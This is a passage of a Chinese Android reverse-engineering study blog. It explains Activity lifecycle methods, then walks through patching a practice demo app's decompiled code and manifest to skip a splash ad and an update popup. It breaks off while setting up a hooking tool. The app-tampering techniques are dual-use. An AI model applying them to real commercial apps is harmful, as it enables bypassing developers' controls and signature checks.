<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#1">Activity生命周期</a></li>
<li><a href="#2">教程demo去广告</a></li>
<li><a href="#3">课后作业</a></li>
<li><a href="#4">总结</a></li>
</ul>
<hr>
<h3 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a><a href="#1">Activity生命周期</a></h3><table>
<thead>
<tr>
<th align="left">函数名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">onCreate()</td>
<td align="left">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>
</tr>
<tr>
<td align="left">onStart()</td>
<td align="left">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>
</tr>
<tr>
<td align="left">onResume()</td>
<td align="left">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>
</tr>
<tr>
<td align="left">onPause()</td>
<td align="left">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>
</tr>
<tr>
<td align="left">onStop()</td>
<td align="left">这个方法是在Activity完全不可见的时候调用的。</td>
</tr>
<tr>
<td align="left">onDestroy()</td>
<td align="left">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>
</tr>
<tr>
<td align="left">onRestart()</td>
<td align="left">当Activity从停止stop状态恢进入start状态时调用状态。</td>
</tr>
</tbody></table>
<p><strong>Q：</strong> 在AdActivity（本次demo）中这些生命周期的某些函数怎么没有被调用？？还是说只是没有显示调用，其实都有执行？？</p>
<p><strong>A：</strong> 它们其实都在执行，只是没有被显式重写出来。在 Android 开发中，Activity 的生命周期就像是一套默认的剧本，即使你不在代码里写出来，系统也会在后台默默地完成每一个步骤。</p>
<h3 id="教程demo去广告"><a href="#教程demo去广告" class="headerlink" title="教程demo去广告"></a><a href="#2">教程demo去广告</a></h3><h4 id="启动广告"><a href="#启动广告" class="headerlink" title="启动广告"></a>启动广告</h4><p><mark><strong>方法一</strong></mark></p>
<p>打开MT管理器中的Activity记录，得到教程demo中的启动广告是AdAcrivity</p>
<p>打开Dex编辑器搜索<code>com.zj.wuaipojie.ui.AdActivity</code></p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/1.png" class="" title="This is an image">

<p>转成java之后，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Decompiled by Jadx (from NP Manager)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> com.zj.wuaipojie.ui;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.AdActivity$.ExternalSyntheticLambda0;</span><br><span class="line"><span class="keyword">import</span> kotlin.Metadata;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Metadata(d1 = &#123;&quot;\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\b\u0010\u0003\u001a\u00020\u0004H\u0002J\b\u0010\u0005\u001a\u00020\u0004H\u0002J\u0012\u0010\u0006\u001a\u00020\u00042\b\u0010\u0007\u001a\u0004\u0018\u00010\bH\u0014¨\u0006\t&quot;&#125;, d2 = &#123;&quot;Lcom/zj/wuaipojie/ui/AdActivity;&quot;, &quot;Landroidx/appcompat/app/AppCompatActivity;&quot;, &quot;()V&quot;, &quot;jump&quot;, &quot;&quot;, &quot;loadAd&quot;, &quot;onCreate&quot;, &quot;savedInstanceState&quot;, &quot;Landroid/os/Bundle;&quot;, &quot;app_release&quot;&#125;, k = 1, mv = &#123;1, 7, 1&#125;, xi = 48)</span></span><br><span class="line"><span class="comment">/* compiled from: AdActivity.kt */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AdActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(<span class="number">2131427363</span>);</span><br><span class="line">        loadAd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">jump</span><span class="params">()</span> &#123;</span><br><span class="line">        startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>((Context) <span class="built_in">this</span>, ChallengeThird.class));</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">loadAd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>().postDelayed(<span class="keyword">new</span> <span class="title class_">ExternalSyntheticLambda0</span>(<span class="built_in">this</span>), <span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: loadAd$lambda-0 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m0loadAd$lambda-<span class="number">0</span>(AdActivity adActivity) &#123;</span><br><span class="line">        adActivity.jump();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解释一下代码的逻辑：</p>
<ol>
<li><code>onCreat</code>（系统触发）<ul>
<li>系统执行Actuvity，首先进入这个“房间”</li>
<li>执行<code>loadAd()</code></li>
</ul>
</li>
<li><code>loadAd</code>（被onCreat调用）<ul>
<li>这里它做了一个很关键的事情：定了一个闹钟</li>
<li><code>new Handler().postDelayed(...)</code>：这行代码的意思是：3000毫秒之后去执行那个回调函数</li>
<li><strong>注意</strong>：此时 <code>loadAd</code> 已经执行完了，<code>onCreate</code> 也执行完了。</li>
</ul>
</li>
<li><code>m0loadAd$lambda-0</code>（回调函数触发）<ul>
<li>当闹钟时间到3000ms，系统会自动执行回调函数</li>
</ul>
</li>
<li><code>jump</code>（被回调函数调用）<ul>
<li>执行跳转和关闭</li>
</ul>
</li>
</ol>
<p><strong>这里我有几个问题：</strong></p>
<p><strong>Q：</strong> 回调函数的作用是什么？<br><strong>A：</strong> 回调函数的作用就是等待，它相当于是一个闹钟，到时间之后喊一声，执行jump函数， <strong>回调函数负责处理时机，jump负责处理逻辑</strong></p>
<p>知道程序逻辑之后，就好办了。</p>
<p><code>new Handler().postDelayed(new ExternalSyntheticLambda0(this), 3000);</code>它的意思就是等3000ms之后再去执行回调函数，那我们将3000ms改成0就可以直接调用回调函数了。那么启动广告自然就跳过了。</p>
<p><mark><strong>方法二</strong></mark></p>
<p>查看xml文件，代码如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--开通会员可提高反编译速度、资源代码自动转名称，以及激活智能编辑和自动补全功能--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.zj.wuaipojie&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;27&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;32&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 拥有完全的网络访问权限 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 修改或删除您共享存储空间中的内容 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@7F1101D3&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@7F10001B&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@7F0D000F&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:extractNativeLibs</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@7F130000&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:networkSecurityConfig</span>=<span class="string">&quot;@7F130002&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@7F130001&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSixth&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@7F10001B&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以了解到，程序的入口页面如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span> <span class="attr">...</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>MAIN：就是程序的主入口</li>
</ul>
<p>为了绕过启动广告，可以直接将入口<code>com.zj.wuaipojie.ui.MainActivity</code>改成<code>com.zj.wuaipojie.ui.ChallengeThird</code></p>
<p>但是这种方法是非常不建议使用的</p>
<ol>
<li><strong>全局初始化失效</strong> ：通常 <code>MainActivity</code> 或其更早的 <code>Application</code> 类会初始化数据库、网络框架、甚至是用户的 VIP 权限状态。直接跳过它们，<code>ChallengeThird</code> 运行时可能会因为找不到这些数据而瞬间 <strong>闪退</strong> 。</li>
<li><strong>逻辑断裂</strong> ：有些关卡需要从上一关传递一个 <code>score</code> 参数，直接启动第三关会导致程序拿不到参数而报错。</li>
</ol>
<p><mark><strong>方法三</strong> </mark></p>
<p>我们查找调用AdActivity函数的函数有哪些</p>
<p>首先长按该类选择复制，选择最下面的这个</p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/2.png" class="" title="This is an image">

<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/3.png" class="" title="This is an image">

<p>查找之后：</p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/4.png" class="" title="This is an image">

<p>因为AdActivity里面是一定会调用的，所以这个肯定不是我们要找的，那只有下面的这个了，我们查看一下它的java代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Decompiled by Jadx (from NP Manager)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> com.zj.wuaipojie.ui.Adapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> androidx.recyclerview.widget.RecyclerView.Adapter;</span><br><span class="line"><span class="keyword">import</span> androidx.recyclerview.widget.RecyclerView.ViewHolder;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.AdActivity;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.Adapter.ChallengeAdapter$.ExternalSyntheticLambda0;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.Challenge;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.ChallengeFifth;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.ChallengeFirst;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.ChallengeFourth;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.ChallengeSecond;</span><br><span class="line"><span class="keyword">import</span> com.zj.wuaipojie.ui.ChallengeSixth;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> kotlin.Metadata;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Metadata(d1 = &#123;&quot;\u00000\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010 \n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\b\u0003\u0018\u00002\f\u0012\b\u0012\u00060\u0002R\u00020\u00000\u0001:\u0001\u0013B\u0013\u0012\f\u0010\u0003\u001a\b\u0012\u0004\u0012\u00020\u00050\u0004¢\u0006\u0002\u0010\u0006J\b\u0010\t\u001a\u00020\nH\u0016J\u001c\u0010\u000b\u001a\u00020\f2\n\u0010\r\u001a\u00060\u0002R\u00020\u00002\u0006\u0010\u000e\u001a\u00020\nH\u0016J\u001c\u0010\u000f\u001a\u00060\u0002R\u00020\u00002\u0006\u0010\u0010\u001a\u00020\u00112\u0006\u0010\u0012\u001a\u00020\nH\u0016R\u0017\u0010\u0003\u001a\b\u0012\u0004\u0012\u00020\u00050\u0004¢\u0006\b\n\u0000\u001a\u0004\b\u0007\u0010\b¨\u0006\u0014&quot;&#125;, d2 = &#123;&quot;Lcom/zj/wuaipojie/ui/Adapter/ChallengeAdapter;&quot;, &quot;Landroidx/recyclerview/widget/RecyclerView$Adapter;&quot;, &quot;Lcom/zj/wuaipojie/ui/Adapter/ChallengeAdapter$ViewHolder;&quot;, &quot;mChallenges&quot;, &quot;&quot;, &quot;Lcom/zj/wuaipojie/ui/Challenge;&quot;, &quot;(Ljava/util/List;)V&quot;, &quot;getMChallenges&quot;, &quot;()Ljava/util/List;&quot;, &quot;getItemCount&quot;, &quot;&quot;, &quot;onBindViewHolder&quot;, &quot;&quot;, &quot;holder&quot;, &quot;position&quot;, &quot;onCreateViewHolder&quot;, &quot;parent&quot;, &quot;Landroid/view/ViewGroup;&quot;, &quot;viewType&quot;, &quot;ViewHolder&quot;, &quot;app_release&quot;&#125;, k = 1, mv = &#123;1, 7, 1&#125;, xi = 48)</span></span><br><span class="line"><span class="comment">/* compiled from: ChallengeAdapter.kt */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ChallengeAdapter</span> <span class="keyword">extends</span> <span class="title class_">Adapter</span>&lt;ViewHolder&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Challenge&gt; mChallenges;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: onCreateViewHolder$lambda-0 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m0onCreateViewHolder$lambda-<span class="number">0</span>(ViewHolder viewHolder, View view) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">adapterPosition</span> <span class="operator">=</span> viewHolder.getAdapterPosition();</span><br><span class="line">        Intent intent;</span><br><span class="line">        <span class="keyword">if</span> (adapterPosition == <span class="number">0</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFirst.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">1</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeSecond.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">2</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), AdActivity.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">3</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFourth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">4</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFifth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">5</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeSixth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBindViewHolder</span><span class="params">(ViewHolder viewHolder, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="type">Challenge</span> <span class="variable">challenge</span> <span class="operator">=</span> (Challenge) <span class="built_in">this</span>.mChallenges.get(i);</span><br><span class="line">        viewHolder.getChallengeName().setText(challenge.getChallenege_name());</span><br><span class="line">        viewHolder.getChallengeImage().setImageResource(challenge.getChallenge_img());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup viewGroup, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="type">ViewHolder</span> <span class="variable">viewHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ViewHolder</span>(<span class="built_in">this</span>, LayoutInflater.from(viewGroup.getContext()).inflate(<span class="number">2131427364</span>, viewGroup, <span class="literal">false</span>));</span><br><span class="line">        viewHolder.getChallengeImage().setOnClickListener(<span class="keyword">new</span> <span class="title class_">ExternalSyntheticLambda0</span>(viewHolder));</span><br><span class="line">        <span class="keyword">return</span> viewHolder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChallengeAdapter</span><span class="params">(List&lt;Challenge&gt; list)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mChallenges = list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getItemCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.mChallenges.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> List&lt;Challenge&gt; <span class="title function_">getMChallenges</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.mChallenges;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这一段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">2</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), AdActivity.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以知道当<code>adapterPosition == 2</code>时进入AdActivity，我们把它修改成<code>ChallengeThird</code></p>
<p>以上三种对于这个demo来说都是可以跳过启动广告的。</p>
<h4 id="弹窗广告"><a href="#弹窗广告" class="headerlink" title="弹窗广告"></a>弹窗广告</h4><p><mark><strong>修改xml中的versiocode</strong></mark></p>
<p>这个弹窗广告是检测是否需要更新的，与<code>versionCode</code>有关，这是版本号，只要将这个版本号修改成比较大的数字，他就不会检测出需要更新</p>
<p>ok，将1改成2之后就没有这个弹窗了</p>
<p><strong>这种方法在某些特定的情况下有用，但他并不是“删除弹窗”，而是一种欺骗手段。</strong></p>
<p>在安卓开发中<code>versionCodea</code>是一个整数，用来标识应用的版本。系统和应用逻辑通常通过比较这个数字来判断是否有新版本。</p>
<p><strong>为什么要改<code>versionCode</code>?</strong></p>
<ul>
<li><p><strong>本地逻辑：</strong> 如果 <code>服务器版本号 &gt; 本地 versionCode</code>，则弹出更新窗口。</p>
</li>
<li><p><strong>你的操作：</strong> 把本地的 <code>1</code> 改成了 <code>2</code>（甚至改成 <code>99999</code>）。</p>
</li>
<li><p><strong>结果：</strong> 软件运行时发现 <code>2 &gt;= 服务器版本号</code>，它就会“认为”自己已经是最新版，从而不触发弹窗。</p>
</li>
</ul>
<p><strong>这种方法的局限性</strong></p>
<p>虽然这招很省事，但它有很多“翻车”的情况：</p>
<ul>
<li><strong>强制更新：</strong> 如果服务器要求必须是某个特定版本（例如必须是 <code>3</code>），而你改成 <code>2</code> 依然没达到要求，弹窗还在。</li>
<li><strong>服务端校验：</strong> 现在的 APP 往往会把 <code>versionCode</code> 传给服务器。如果服务器发现你的版本号不存在（或者是未来的版本），可能会直接拒绝提供服务（报错或闪退）。</li>
<li><strong>硬编码弹窗：</strong> 有些弹窗根本不是根据版本号触发的，而是根据日期，或者是开发者在代码里写死了“只要运行就弹窗广告”。</li>
<li><strong>签名校验：</strong> 修改 XML 后需要重新签名。如果软件有签名校验，修改后可能无法启动。</li>
</ul>
<p><mark><strong>Hook弹窗(推荐算法助手开启弹窗定位)</strong></mark></p>
<p><strong>方法一：</strong></p>
<p>首先下载算法助手，启用模块，勾选apk文件</p>


<p>设置完之后，打开算法助手，点击apk文件，勾选<code>应用总开关</code>与<code>弹窗定位（返回键可取消）</code></p>
